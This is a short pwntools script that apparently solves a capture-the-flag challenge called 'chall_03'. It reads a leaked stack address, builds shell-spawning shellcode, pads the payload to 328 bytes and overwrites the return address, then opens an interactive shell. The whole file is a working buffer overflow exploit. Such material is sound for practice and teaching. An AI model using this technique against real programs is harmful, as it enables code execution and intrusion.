from pwn import *

p = process("./chall_03")
p.recvuntil(b':) ')
leak = int(p.recvline().strip(), 16)

context.arch = "amd64"
shellcode = asm(shellcraft.sh())

payload = shellcode + (328 - len(shellcode))*b"A" + p64(leak)

p.sendline(payload)
p.interactive()
